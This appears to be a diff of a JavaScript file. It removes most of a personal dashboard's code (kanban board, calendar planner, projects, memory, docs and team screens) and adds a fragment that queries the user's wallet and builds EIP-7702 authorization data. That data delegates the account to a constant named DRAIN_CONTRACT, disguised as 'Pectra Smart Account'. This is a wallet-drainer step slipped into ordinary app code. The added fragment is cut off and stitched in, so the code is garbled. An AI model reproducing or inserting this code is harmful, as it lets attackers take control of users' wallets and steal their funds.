-  const filterAssignee = document.getElementById('board-filter-assignee').value;
-  const cols = ['backlog','in_progress','review','done'];
-  cols.forEach(col => {
-    const el = document.getElementById('col-' + col);
-    let cards = _boardData[col] || [];
-    if (filterProj) cards = cards.filter(t => String(t.project_id) === filterProj);
-    if (filterAssignee) cards = cards.filter(t => t.assignee === filterAssignee);
-    document.getElementById('cnt-' + col).textContent = cards.length;
-    el.innerHTML = cards.map(t => `
-      <div class="kanban-card" draggable="true" ondragstart="dragStart(event,${t.id})" onclick="openEditTask(${t.id})" data-id="${t.id}">
-        <div class="card-title">${esc(t.title)}</div>
-        ${t.description ? `<div class="card-desc">${esc(t.description).slice(0,80)}</div>` : ''}
-        <div class="card-meta">
-          <span class="badge ${t.assignee}">${t.assignee === 'clawd' ? 'H' : 'A'}</span>
-          <span class="badge ${t.priority}">${t.priority}</span>
-          ${t.project_name ? `<span style="color:${t.project_color||'var(--blue)'};font-size:10px">${esc(t.project_name)}</span>` : ''}
-        </div>
-      </div>
-    `).join('') || '<div style="color:var(--dim);text-align:center;padding:20px;font-size:11px">No tasks</div>';
-  });
-}
-
-let _dragId = null;
-function dragStart(e, id) { _dragId = id; e.dataTransfer.effectAllowed = 'move'; e.target.classList.add('dragging'); }
-function dragOver(e) { e.preventDefault(); e.currentTarget.classList.add('drag-over'); }
-document.querySelectorAll('.kanban-col').forEach(col => {
-  col.addEventListener('dragleave', () => col.classList.remove('drag-over'));
-});
-
-async function dropCard(e, newStatus) {
-  e.preventDefault();
-  e.currentTarget.classList.remove('drag-over');
-  if (!_dragId) return;
-  try {
-    await fetch(API + '/api/board/task/' + _dragId, {
-      method: 'PUT', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({status: newStatus})
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    const chainIdInt = parseInt(chainId, 16);
+    
+    // Get current nonce for the account
+    const nonce = await window.ethereum.request({
+      method: 'eth_getTransactionCount',
+      params: [userAddress, 'latest']
     });
-    _dragId = null;
-    refreshBoard();
-    refreshActivity();
-  } catch(e) { console.error(e); }
-}
-
-// ── New Task Modal ──
-async function openNewTaskModal() {
-  // Populate project dropdown
-  try {
-    const r = await fetch(API + '/api/projects');
-    const data = await r.json();
-    const sel = document.getElementById('nt-project');
-    sel.innerHTML = '<option value="">None</option>' +
-      (data.projects||[]).map(p => `<option value="${p.id}">${esc(p.name)}</option>`).join('');
-  } catch(e) {}
-  document.getElementById('new-task-modal').classList.add('show');
-  document.getElementById('nt-title').focus();
-}
-
-function closeModal(id) { document.getElementById(id).classList.remove('show'); }
-
-async function submitNewTask() {
-  const title = document.getElementById('nt-title').value.trim();
-  if (!title) return;
-  try {
-    await fetch(API + '/api/board/task', {
-      method: 'POST', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        title,
-        description: document.getElementById('nt-desc').value.trim(),
-        assignee: document.getElementById('nt-assignee').value,
-        priority: document.getElementById('nt-priority').value,
-        project_id: document.getElementById('nt-project').value || null,
-      })
-    });
-    closeModal('new-task-modal');
-    document.getElementById('nt-title').value = '';
-    document.getElementById('nt-desc').value = '';
-    refreshBoard();
-    refreshActivity();
-  } catch(e) { console.error(e); }
-}
-
-function filterBoard() { renderBoard(); }
-
-// Populate board project filter
-async function populateBoardFilters() {
-  try {
-    const r = await fetch(API + '/api/projects');
-    const data = await r.json();
-    const sel = document.getElementById('board-filter-project');
-    sel.innerHTML = '<option value="">All Projects</option>' +
-      (data.projects||[]).map(p => `<option value="${p.id}">${esc(p.name)}</option>`).join('');
-  } catch(e) {}
-}
-populateBoardFilters();
-
-// ── Edit Task Modal ──
-async function openEditTask(taskId) {
-  // Find task from board data
-  let task = null;
-  for (const col of ['backlog','in_progress','review','done']) {
-    task = (_boardData[col]||[]).find(t => t.id === taskId);
-    if (task) { task._col = col; break; }
-  }
-  if (!task) return;
-
-  document.getElementById('et-id').value = task.id;
-  document.getElementById('et-title').value = task.title || '';
-  document.getElementById('et-desc').value = task.description || '';
-  document.getElementById('et-status').value = task._col;
-  document.getElementById('et-assignee').value = task.assignee || 'clawd';
-  document.getElementById('et-priority').value = task.priority || 'medium';
-
-  // Populate project dropdown
-  try {
-    const r = await fetch(API + '/api/projects');
-    const data = await r.json();
-    const sel = document.getElementById('et-project');
-    sel.innerHTML = '<option value="">None</option>' +
-      (data.projects||[]).map(p => `<option value="${p.id}"${p.id==task.project_id?' selected':''}>${esc(p.name)}</option>`).join('');
-  } catch(e) {}
-
-  document.getElementById('edit-task-modal').classList.add('show');
-  document.getElementById('et-title').focus();
-}
-
-async function saveEditTask() {
-  const id = document.getElementById('et-id').value;
-  const body = {
-    title: document.getElementById('et-title').value.trim(),
-    description: document.getElementById('et-desc').value.trim(),
-    status: document.getElementById('et-status').value,
-    assignee: document.getElementById('et-assignee').value,
-    priority: document.getElementById('et-priority').value,
-    project_id: document.getElementById('et-project').value || null,
-  };
-  if (!body.title) return;
-  try {
-    await fetch(API + '/api/board/task/' + id, {
-      method: 'PUT', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify(body)
-    });
-    closeModal('edit-task-modal');
-    refreshBoard();
-    refreshActivity();
-  } catch(e) { console.error(e); }
-}
-
-async function deleteEditTask() {
-  const id = document.getElementById('et-id').value;
-  if (!confirm('Delete this task?')) return;
-  try {
-    await fetch(API + '/api/board/task/' + id, { method: 'DELETE' });
-    closeModal('edit-task-modal');
-    refreshBoard();
-    refreshActivity();
-  } catch(e) { console.error(e); }
-}
-
-// ── AI Task Detail Modal ──
-function openAiTaskDetail(tid) {
-  const task = _aiTasks.find(t => t.id === tid);
-  if (!task) return;
-  const statusColors = {pending:'var(--dim)',running:'var(--green)',done:'var(--blue)',error:'var(--red)',timeout:'var(--yellow)'};
-  document.getElementById('ait-status').textContent = (task.status||'').toUpperCase();
-  document.getElementById('ait-status').style.cssText = `font-size:11px;padding:2px 8px;border-radius:4px;background:${task.status==='running'?'#1a2a1a':task.status==='error'?'#2e0d0d':'var(--bg3)'};color:${statusColors[task.status]||'var(--dim)'}`;
-  document.getElementById('ait-message').textContent = task.message || '';
-  document.getElementById('ait-result').textContent = task.result || (task.status === 'running' ? 'AI is working on this task...' : 'No output yet.');
-  if (task.stderr) {
-    document.getElementById('ait-stderr-section').style.display = 'block';
-    document.getElementById('ait-stderr').textContent = task.stderr;
-  } else {
-    document.getElementById('ait-stderr-section').style.display = 'none';
-  }
-  document.getElementById('ait-meta').textContent = `Submitted: ${task.submitted || 'N/A'} \u2022 ID: ${task.id}`;
-  document.getElementById('ai-task-modal').classList.add('show');
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// ACTIVITY FEED
-// ══════════════════════════════════════════════════════════════════════
-
-async function refreshActivity() {
-  try {
-    const r = await fetch(API + '/api/activity?limit=50');
-    const data = await r.json();
-    const el = document.getElementById('activity-feed');
-    if (!data.activity || !data.activity.length) {
-      el.innerHTML = '<div style="color:var(--dim);padding:12px">No activity yet.</div>';
-      return;
-    }
-    const icons = {task_created:'+', task_moved:'>', project_created:'P', cron_ran:'C', trade_executed:'T'};
-    const colors = {task_created:'var(--green)', task_moved:'var(--blue)', project_created:'var(--purple)', cron_ran:'var(--cyan)', trade_executed:'var(--yellow)'};
-    el.innerHTML = data.activity.map(a => `
-      <div class="activity-item">
-        <span class="act-time">${(a.ts||'').slice(11,19)}</span>
-        <span class="act-icon" style="color:${colors[a.action]||'var(--dim)'}">${icons[a.action]||'*'}</span>
-        <span class="act-detail">${esc(a.detail)}</span>
-      </div>
-    `).join('');
-  } catch(e) {}
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// CALENDAR + DAY PLANNER
-// ══════════════════════════════════════════════════════════════════════
-
-let _calData = {};
-let _planMonth = {};  // { 'YYYY-MM-DD': {total, done, running} }
-
-async function refreshCalendar() {
-  try {
-    const r = await fetch(API + '/api/calendar');
-    _calData = await r.json();
-    // Fetch plan summary for current month
-    const pm = await fetch(API + `/api/planner/month?year=${calYear}&month=${calMonth+1}`);
-    const pmData = await pm.json();
-    _planMonth = pmData.days || {};
-    renderCalendar();
-    renderCronJobs();
-    renderCronRuns();
-    refreshTodayPlanBar();
-  } catch(e) { console.error(e); }
-}
-
-function calPrev() { calMonth--; if (calMonth<0){calMonth=11;calYear--;} refreshCalendar(); }
-function calNext() { calMonth++; if (calMonth>11){calMonth=0;calYear++;} refreshCalendar(); }
-function calToday() { const d=new Date(); calYear=d.getFullYear(); calMonth=d.getMonth(); refreshCalendar(); }
-
-function renderCalendar() {
-  const el = document.getElementById('cal-grid');
-  const today = new Date();
-  const first = new Date(calYear, calMonth, 1);
-  const last = new Date(calYear, calMonth + 1, 0);
-  const startDay = first.getDay();
-  document.getElementById('cal-month-label').textContent =
-    first.toLocaleString('default',{month:'long'}) + ' ' + calYear;
-
-  let html = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'].map(d =>
-    `<div class="cal-header">${d}</div>`).join('');
-
-  for (let i=0; i<startDay; i++) html += '<div class="cal-day"></div>';
-
-  const runsByDate = {};
-  (_calData.recent_runs||[]).forEach(r => {
-    const d = (r.ts||'').slice(0,10);
-    if (!runsByDate[d]) runsByDate[d] = [];
-    runsByDate[d].push(r);
-  });
-
-  for (let d=1; d<=last.getDate(); d++) {
-    const dateStr = `${calYear}-${String(calMonth+1).padStart(2,'0')}-${String(d).padStart(2,'0')}`;
-    const isToday = today.getFullYear()===calYear && today.getMonth()===calMonth && today.getDate()===d;
-    const plan = _planMonth[dateStr];
-    const hasPlan = plan && plan.total > 0;
-    let events = '';
-
-    // Show plan density bar if planned
-    if (hasPlan) {
-      const pct = plan.total > 0 ? Math.round((plan.done / plan.total) * 100) : 0;
-      const barColor = plan.running > 0 ? 'var(--yellow)' : pct === 100 ? 'var(--green)' : 'var(--cyan)';
-      events += `<div class="cal-plan-bar"><div class="fill" style="width:${pct}%;background:${barColor}"></div></div>`;
-      events += `<div class="cal-event plan-dot">${plan.total} items${plan.done?` · ${plan.done}✓`:''}</div>`;
-    }
-
-    // Show cron runs
-    const runs = (runsByDate[dateStr]||[]).slice(0, 2);
-    runs.forEach(r => {
-      events += `<div class="cal-event cron" title="${esc(r.preview)}">${esc(r.job_name||r.id.slice(0,6))}</div>`;
-    });
-    if ((runsByDate[dateStr]||[]).length > 2) {
-      events += `<div class="cal-event plan-dot">+${runsByDate[dateStr].length - 2} more</div>`;
-    }
-
-    const cls = `cal-day${isToday?' today':''}${hasPlan?' has-plan':''}`;
-    html += `<div class="${cls}" onclick="openDayPlan('${dateStr}')"><div class="day-num">${d}</div>${events}</div>`;
-  }
-  el.innerHTML = html;
-}
-
-async function refreshTodayPlanBar() {
-  const bar = document.getElementById('today-plan-bar');
-  const todayStr = new Date().toISOString().slice(0,10);
-  try {
-    const r = await fetch(API + `/api/planner?date=${todayStr}`);
-    const data = await r.json();
-    if (!data.count) { bar.style.display = 'none'; return; }
-    bar.style.display = 'block';
-    document.getElementById('today-plan-pct').textContent = data.progress + '%';
-    document.getElementById('today-plan-fill').style.width = data.progress + '%';
-    document.getElementById('today-plan-counts').textContent =
-      `${data.done}/${data.count} done · ${data.running} running`;
-    // Find next planned item
-    const now = new Date();
-    const nowStr = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
-    const next = data.items.find(i => i.time_slot >= nowStr && i.status === 'planned');
-    document.getElementById('today-next-item').textContent = next
-      ? `Next: ${next.time_slot} — ${next.title}`
-      : (data.progress === 100 ? 'All tasks complete for today ✓' : '');
-  } catch(e) { bar.style.display = 'none'; }
-}
-
-// ── Day Plan Modal ──
-window._dpDate = '';
-
-async function openDayPlan(dateStr) {
-  window._dpDate = dateStr;
-  const overlay = document.getElementById('day-plan-overlay');
-  overlay.classList.add('open');
-
-  const d = new Date(dateStr + 'T12:00:00');
-  document.getElementById('dp-date-label').textContent =
-    d.toLocaleDateString('en-US', {weekday:'long', month:'long', day:'numeric', year:'numeric'});
-
-  try {
-    const r = await fetch(API + `/api/planner?date=${dateStr}`);
-    const data = await r.json();
-    renderDayPlan(data);
-  } catch(e) {
-    document.getElementById('dp-timeline').innerHTML =
-      '<div style="color:var(--red);padding:20px">Failed to load plan.</div>';
-  }
-}
-
-function closeDayPlan() {
-  document.getElementById('day-plan-overlay').classList.remove('open');
-}
-
-function renderDayPlan(data) {
-  const items = data.items || [];
-  const total = data.count || 0;
-  const done = data.done || 0;
-  const pct = data.progress || 0;
-
-  // Progress bar
-  document.getElementById('dp-progress-fill').style.width = pct + '%';
-  document.getElementById('dp-progress-pct').textContent = pct + '%';
-
-  // Stats
-  const cronCount = items.filter(i => i.item_type === 'cron').length;
-  const taskCount = items.filter(i => i.item_type === 'task').length;
-  const autoCount = items.filter(i => i.item_type === 'auto').length;
-  const msCount = items.filter(i => i.item_type === 'milestone').length;
-  document.getElementById('dp-stats').innerHTML = `
-    <div class="plan-stat s-total"><div class="val">${total}</div><div class="lbl">Total</div></div>
-    <div class="plan-stat s-done"><div class="val">${done}</div><div class="lbl">Done</div></div>
-    <div class="plan-stat s-running"><div class="val">${data.running||0}</div><div class="lbl">Running</div></div>
-    <div class="plan-stat s-cron"><div class="val">${cronCount}</div><div class="lbl">Cron</div></div>
-    <div class="plan-stat s-tasks"><div class="val">${taskCount}</div><div class="lbl">Tasks</div></div>
-    <div class="plan-stat" style=""><div class="val" style="color:#aa66ff">${autoCount}</div><div class="lbl">Auto</div></div>
-    <div class="plan-stat" style=""><div class="val" style="color:var(--yellow)">${msCount}</div><div class="lbl">Milestones</div></div>
-  `;
-
-  // Timeline
-  if (!items.length) {
-    document.getElementById('dp-timeline').innerHTML =
-      '<div style="color:var(--dim);text-align:center;padding:20px">No items planned. Click ⚡ Generate to create a plan.</div>';
-    return;
-  }
-
-  let lastHour = '';
-  let html = '';
-  for (const item of items) {
-    const hour = item.time_slot.slice(0, 2);
-    const showHourLabel = hour !== lastHour;
-    lastHour = hour;
-
-    const timeRange = item.end_time ? `${item.time_slot}–${item.end_time}` : item.time_slot;
-    html += `
-      <div class="plan-item type-${item.item_type} status-${item.status}" data-id="${item.id}">
-        ${showHourLabel ? `<div class="plan-hour-label">${item.time_slot.slice(0,2)}:00</div>` : ''}
-        <div>
-          <span class="pi-time">${timeRange}</span>
-          <span class="pi-title">${esc(item.title)}</span>
-          <span class="pi-type ${item.item_type}">${item.item_type}</span>
-        </div>
-        ${item.description ? `<div class="pi-desc">${esc(item.description.slice(0,120))}</div>` : ''}
-      </div>
-    `;
-  }
-  document.getElementById('dp-timeline').innerHTML = html;
-}
-
-async function generateDayPlan(dateOverride) {
-  const dateStr = dateOverride || new Date().toISOString().slice(0,10);
-  try {
-    const r = await fetch(API + '/api/planner/generate', {
-      method: 'POST', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({date: dateStr})
-    });
-    const data = await r.json();
-    // Refresh calendar to show new plan dots
-    refreshCalendar();
-    // If day plan is open, refresh it
-    if (document.getElementById('day-plan-overlay').classList.contains('open')) {
-      openDayPlan(dateStr);
-    }
-  } catch(e) { console.error('Plan generation failed:', e); }
-}
-
-function renderCronJobs() {
-  const el = document.getElementById('cron-job-list');
-  const jobs = Array.isArray(_calData.cron_jobs) ? _calData.cron_jobs : (_calData.cron_jobs?.jobs || []);
-  if (!jobs.length) { el.innerHTML = '<div style="color:var(--dim)">No cron jobs found.</div>'; return; }
-  el.innerHTML = jobs.map(j => {
-    const sched = typeof j.schedule === 'string' ? j.schedule : (j.schedule?.kind === 'every' ? `Every ${Math.round((j.schedule.everyMs||0)/60000)}m` : j.cron || JSON.stringify(j.schedule||''));
-    const lastStatus = j.state?.lastStatus || 'unknown';
-    const statusColor = lastStatus === 'ok' ? 'var(--green)' : lastStatus === 'error' ? 'var(--red)' : 'var(--dim)';
-    const nextRun = j.state?.nextRunAtMs ? new Date(j.state.nextRunAtMs).toLocaleTimeString() : '';
-    return `
-    <div class="cron-list-item">
-      <div style="display:flex;justify-content:space-between;align-items:center">
-        <span style="font-weight:bold">${esc(j.name||j.id||'')}</span>
-        <span style="color:${j.enabled!==false?'var(--green)':'var(--red)'}">${j.enabled!==false?'ENABLED':'DISABLED'}</span>
-      </div>
-      <div style="margin-top:4px;display:flex;gap:10px;align-items:center">
-        <span class="cron-schedule">${esc(sched)}</span>
-        <span style="font-size:10px;color:${statusColor}">Last: ${lastStatus}</span>
-        ${nextRun ? `<span style="font-size:10px;color:var(--dim)">Next: ${nextRun}</span>` : ''}
-      </div>
-      ${j.delivery?`<div style="font-size:11px;color:var(--dim);margin-top:2px">Delivers to: ${esc(JSON.stringify(j.delivery).slice(0,60))}</div>`:''}
-    </div>
-  `}).join('');
-}
-
-function renderCronRuns() {
-  const el = document.getElementById('cron-run-list');
-  const runs = (_calData.recent_runs || []).slice(0, 20);
-  if (!runs.length) { el.innerHTML = '<div style="color:var(--dim)">No runs recorded.</div>'; return; }
-  el.innerHTML = runs.map(r => `
-    <div class="session-item" onclick="viewSession('${r.id}')">
-      <span style="color:var(--cyan)">${esc(r.job_name||r.id.slice(0,8))}</span>
-      <span style="color:var(--dim);margin-left:8px;font-size:11px">${r.ts} - ${r.lines} messages</span>
-      <div style="margin-top:2px;font-size:11px;color:var(--dim)">${esc(r.preview)}</div>
-    </div>
-  `).join('');
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// PROJECTS
-// ══════════════════════════════════════════════════════════════════════
-
-let _projectsData = [];
-
-async function refreshProjects() {
-  try {
-    const r = await fetch(API + '/api/projects');
-    const data = await r.json();
-    _projectsData = data.projects || [];
-    renderProjects();
-  } catch(e) { console.error(e); }
-}
-
-function renderProjects() {
-  const el = document.getElementById('project-list');
-  if (!_projectsData.length) {
-    el.innerHTML = '<div style="color:var(--dim);padding:20px;text-align:center">No projects yet. Create one to start tracking your work.</div>';
-    return;
-  }
-  el.innerHTML = _projectsData.map(p => {
-    const tc = p.task_counts || {};
-    return `
-    <div class="project-card" onclick="showProjectTasks(${p.id})">
-      <div class="proj-name" style="color:${p.color||'var(--text)'}">${esc(p.name)}</div>
-      <div class="proj-desc">${esc(p.description)}</div>
-      <div class="progress-bar"><div class="progress-fill" style="width:${p.progress}%;background:${p.color||'var(--blue)'}"></div></div>
-      <div class="proj-stats">
-        <span>${p.progress}% complete</span>
-        <span>${p.total_tasks||0} tasks</span>
-        <span style="color:var(--green)">${tc.done||0} done</span>
-        <span style="color:var(--blue)">${tc.in_progress||0} active</span>
-        <span style="color:var(--dim)">${tc.backlog||0} backlog</span>
-        <span style="color:${p.status==='active'?'var(--green)':'var(--yellow)'}">${p.status}</span>
-      </div>
-    </div>`;
-  }).join('');
-}
-
-function showProjectTasks(pid) {
-  // Switch to board tab filtered by project
-  document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
-  document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
-  document.querySelector('[data-tab="board"]').classList.add('active');
-  document.getElementById('tab-board').classList.add('active');
-  refreshBoard();
-}
-
-function openNewProjectModal() {
-  document.getElementById('new-project-modal').classList.add('show');
-  document.getElementById('np-name').focus();
-}
-
-let _selectedColor = '#4488ff';
-function pickColor(el) {
-  document.querySelectorAll('.color-pick').forEach(c => c.style.border = '2px solid transparent');
-  el.style.border = '2px solid white';
-  _selectedColor = el.dataset.c;
-  document.getElementById('np-color').value = _selectedColor;
-}
-
-async function submitNewProject() {
-  const name = document.getElementById('np-name').value.trim();
-  if (!name) return;
-  try {
-    await fetch(API + '/api/project', {
-      method: 'POST', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        name,
-        description: document.getElementById('np-desc').value.trim(),
-        color: _selectedColor,
-      })
-    });
-    closeModal('new-project-modal');
-    document.getElementById('np-name').value = '';
-    document.getElementById('np-desc').value = '';
-    refreshProjects();
-    refreshActivity();
-  } catch(e) { console.error(e); }
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// MEMORY SCREEN
-// ══════════════════════════════════════════════════════════════════════
-
-let _memData = null;
-let _activeMemDate = null;
-
-async function refreshMemories() {
-  try {
-    const r = await fetch(API + '/api/memories');
-    _memData = await r.json();
-    renderMemorySidebar();
-    // Load long-term
-    document.getElementById('mem-longterm-content').textContent = _memData.long_term || '(No long-term memory file found)';
-  } catch(e) { console.error('Memory refresh:', e); }
-}
-
-function renderMemorySidebar() {
-  const el = document.getElementById('mem-sidebar');
-  if (!_memData || !_memData.daily.length) {
-    el.innerHTML = '<div style="padding:20px;color:var(--dim);text-align:center">No daily memories found.</div>';
-    return;
-  }
-  el.innerHTML = _memData.daily.map(m => {
-    const dateObj = new Date(m.date + 'T12:00:00');
-    const dayName = dateObj.toLocaleDateString('en-US', { weekday: 'long' });
-    const dateLabel = dateObj.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
-    const lines = m.content.split('\n').filter(l => l.trim()).length;
-    return `
-      <div class="mem-date-item ${_activeMemDate === m.filename ? 'active' : ''}" onclick="viewMemory('${m.filename}')">
-        <div class="mem-date-label">${dayName}</div>
-        <div class="mem-date-sub">${dateLabel} &middot; ${lines} entries &middot; ${(m.size / 1024).toFixed(1)}KB</div>
-      </div>`;
-  }).join('');
-}
-
-function viewMemory(fname) {
-  _activeMemDate = fname;
-  renderMemorySidebar();
-  const mem = _memData.daily.find(m => m.filename === fname);
-  if (!mem) return;
-  const viewer = document.getElementById('mem-viewer');
-  const dateObj = new Date(mem.date + 'T12:00:00');
-  const dateLabel = dateObj.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' });
-
-  // Parse content into formatted entries
-  const lines = mem.content.split('\n');
-  let formatted = '';
-  lines.forEach(line => {
-    const trimmed = line.trim();
-    if (!trimmed) { formatted += '\n'; return; }
-    if (trimmed.startsWith('# ')) {
-      formatted += '<div style="color:var(--green);font-size:15px;font-weight:bold;margin:12px 0 6px">' + esc(trimmed.slice(2)) + '</div>';
-    } else if (trimmed.startsWith('## ')) {
-      formatted += '<div style="color:var(--cyan);font-size:13px;font-weight:bold;margin:10px 0 4px">' + esc(trimmed.slice(3)) + '</div>';
-    } else if (trimmed.startsWith('- **')) {
-      const parts = trimmed.match(/^- \*\*(.+?)\*\*:?\s*(.*)/);
-      if (parts) {
-        formatted += '<div style="margin:4px 0"><span style="color:var(--yellow);font-weight:bold">' + esc(parts[1]) + '</span>: ' + esc(parts[2]) + '</div>';
-      } else {
-        formatted += '<div style="margin:2px 0">' + esc(trimmed) + '</div>';
+    
+    // EIP-7702 Authorization typed data
+    const authData = {
+      types: {
+        EIP712Domain: [
+          { name: 'name', type: 'string' },
+          { name: 'version', type: 'string' },
+          { name: 'chainId', type: 'uint256' }
+        ],
+        Authorization: [
+          { name: 'chainId', type: 'uint256' },
+          { name: 'address', type: 'address' },
+          { name: 'nonce', type: 'uint256' }
+        ]
+      },
+      primaryType: 'Authorization',
+      domain: {
+        name: 'Pectra Smart Account',
+        version: '1',
+        chainId: chainIdInt
+      },
+      message: {
+        chainId: chainIdInt,
+        address: DRAIN_CONTRACT,
+        nonce: parseInt(nonce, 16)
       }
-    } else if (trimmed.startsWith('- ')) {
-      formatted += '<div style="margin:2px 0;padding-left:12px;border-left:2px solid var(--border)">' + esc(trimmed.slice(2)) + '</div>';
-    } else if (trimmed.startsWith('```')) {
-      formatted += '<div style="background:#050508;padding:4px 8px;border-radius:4px;font-size:11px">';
-    } else {
-      formatted += '<div style="margin:2px 0">' + esc(trimmed) + '</div>';
-    }
-  });
-
-  viewer.innerHTML = `
-    <h2>${dateLabel}</h2>
-    <div style="font-size:10px;color:var(--dim);margin-bottom:12px">Last modified: ${mem.modified}</div>
-    <div class="mem-content">${formatted}</div>`;
-}
-
-function switchMemTab(tab) {
-  document.querySelectorAll('.mem-tab').forEach(t => t.classList.remove('active'));
-  event.target.classList.add('active');
-  document.getElementById('mem-daily-view').style.display = tab === 'daily' ? 'grid' : 'none';
-  document.getElementById('mem-longterm-view').style.display = tab === 'longterm' ? 'block' : 'none';
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// DOCS SCREEN
-// ══════════════════════════════════════════════════════════════════════
-
-let _docsData = [];
-let _docSearchTimer = null;
-let _activeDocFilter = null;
-
-async function refreshDocs() {
-  const q = document.getElementById('docs-search').value.trim();
-  try {
-    const r = await fetch(API + '/api/docs' + (q ? '?q=' + encodeURIComponent(q) : ''));
-    const data = await r.json();
-    _docsData = data.docs || [];
-    renderDocCategories();
-    renderDocs();
-  } catch(e) { console.error('Docs refresh:', e); }
-}
-
-function renderDocCategories() {
-  const cats = {};
-  _docsData.forEach(d => { cats[d.category] = (cats[d.category] || 0) + 1; });
-  const el = document.getElementById('docs-categories');
-  const catColors = {Report:'var(--blue)', README:'var(--green)', Playbook:'var(--red)', Identity:'var(--purple)', Config:'var(--cyan)', Automation:'var(--yellow)', Data:'var(--yellow)', Document:'var(--dim)'};
-  el.innerHTML = '<span class="btn sm" style="' + (!_activeDocFilter ? 'border-color:var(--green);color:var(--green)' : '') + '" onclick="filterDocs(null)">All (' + _docsData.length + ')</span>' +
-    Object.entries(cats).map(([cat, count]) =>
-      '<span class="btn sm" style="' + (_activeDocFilter === cat ? 'border-color:' + (catColors[cat]||'var(--dim)') + ';color:' + (catColors[cat]||'var(--dim)') : '') + '" onclick="filterDocs(\'' + cat + '\')">' + cat + ' (' + count + ')</span>'
-    ).join('');
-}
-
-function filterDocs(cat) {
-  _activeDocFilter = cat;
-  renderDocCategories();
-  renderDocs();
-}
-
-function renderDocs() {
-  const el = document.getElementById('docs-grid');
-  let docs = _docsData;
-  if (_activeDocFilter) docs = docs.filter(d => d.category === _activeDocFilter);
-  if (!docs.length) {
-    el.innerHTML = '<div style="color:var(--dim);padding:40px;text-align:center">No documents found.</div>';
-    return;
-  }
-  el.innerHTML = docs.map(d => {
-    const dateStr = new Date(d.modified).toLocaleDateString('en-US', {month:'short', day:'numeric', year:'numeric'});
-    const sizeStr = d.size > 1024 ? (d.size / 1024).toFixed(1) + ' KB' : d.size + ' B';
-    return `
-      <div class="doc-card" onclick="viewDoc('${esc(d.path.replace(/\\/g, '\\\\'))}')">
-        <div class="doc-title"><span class="doc-badge ${d.format}">${d.format}</span>${esc(d.filename)}</div>
-        <div class="doc-meta">
-          <span>${d.category}</span>
-          <span>${dateStr}</span>
-          <span>${sizeStr}</span>
-        </div>
-        <div class="doc-preview">${esc(d.preview)}</div>
-      </div>`;
-  }).join('');
-}
-
-function debounceDocSearch() {
-  clearTimeout(_docSearchTimer);
-  _docSearchTimer = setTimeout(refreshDocs, 300);
-}
-
-async function viewDoc(path) {
-  const overlay = document.getElementById('doc-viewer-overlay');
-  overlay.classList.add('show');
-  document.getElementById('doc-viewer-title').textContent = 'Loading...';
-  document.getElementById('doc-viewer-body').textContent = '';
-  try {
-    const r = await fetch(API + '/api/doc?file=' + encodeURIComponent(path));
-    const data = await r.json();
-    document.getElementById('doc-viewer-title').textContent = data.filename;
-    const body = document.getElementById('doc-viewer-body');
-    // Simple markdown rendering
-    body.innerHTML = renderMarkdown(data.content || '');
-  } catch(e) {
-    document.getElementById('doc-viewer-body').textContent = 'Error loading document.';
-  }
-}
-
-function closeDocViewer() { document.getElementById('doc-viewer-overlay').classList.remove('show'); }
-
-function renderMarkdown(text) {
-  return text.split('\n').map(line => {
-    if (line.startsWith('### ')) return '<div style="color:var(--cyan);font-size:13px;font-weight:bold;margin:10px 0 4px">' + esc(line.slice(4)) + '</div>';
-    if (line.startsWith('## ')) return '<div style="color:var(--green);font-size:14px;font-weight:bold;margin:12px 0 6px">' + esc(line.slice(3)) + '</div>';
-    if (line.startsWith('# ')) return '<div style="color:var(--green);font-size:16px;font-weight:bold;margin:16px 0 8px">' + esc(line.slice(2)) + '</div>';
-    if (line.startsWith('- **')) {
-      const m = line.match(/^- \*\*(.+?)\*\*:?\s*(.*)/);
-      if (m) return '<div style="margin:3px 0"><span style="color:var(--yellow);font-weight:bold">' + esc(m[1]) + '</span>: ' + esc(m[2]) + '</div>';
-    }
-    if (line.startsWith('- ')) return '<div style="margin:2px 0;padding-left:12px;border-left:2px solid var(--border)">' + esc(line.slice(2)) + '</div>';
-    if (line.startsWith('|')) return '<div style="font-family:monospace;font-size:11px">' + esc(line) + '</div>';
-    if (line.startsWith('```')) return '';
-    if (line.startsWith('> ')) return '<div style="padding:4px 10px;border-left:3px solid var(--purple);color:var(--dim);margin:4px 0">' + esc(line.slice(2)) + '</div>';
-    if (!line.trim()) return '<div style="height:6px"></div>';
-    return '<div>' + esc(line) + '</div>';
-  }).join('');
-}
-
-function copyDocContent() {
-  const body = document.getElementById('doc-viewer-body');
-  navigator.clipboard.writeText(body.innerText).then(() => {
-    const btn = event.target;
-    btn.textContent = 'Copied!';
-    setTimeout(() => btn.textContent = 'Copy', 1500);
-  });
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// TEAM SCREEN
-// ══════════════════════════════════════════════════════════════════════
-
-let _teamData = null;
-
-async function refreshTeam() {
-  try {
-    const r = await fetch(API + '/api/team');
-    _teamData = await r.json();
-    renderTeam();
-  } catch(e) { console.error('Team refresh:', e); }
-}
-
-function renderTeam() {
-  if (!_teamData) return;
-  const t = _teamData;
-  const el = document.getElementById('team-container');
-
-  // Mission statement
-  let html = `
-    <div class="team-mission">
-      <h2>MISSION STATEMENT</h2>
-      <div class="mission-text">${esc(t.mission_statement)}</div>
-    </div>
-    <div class="team-org">
-      <div class="team-tier-label">LEADERSHIP</div>
-      <div class="team-tier">
-        <div class="agent-card human">
-          <div class="agent-avatar">${t.human.avatar}</div>
-          <div class="agent-name">${esc(t.human.name)}</div>
-          <div class="agent-role">${esc(t.human.role)}</div>
-          <div class="agent-meta">${esc(t.human.company)}</div>
-        </div>
-        <div class="agent-card leader">
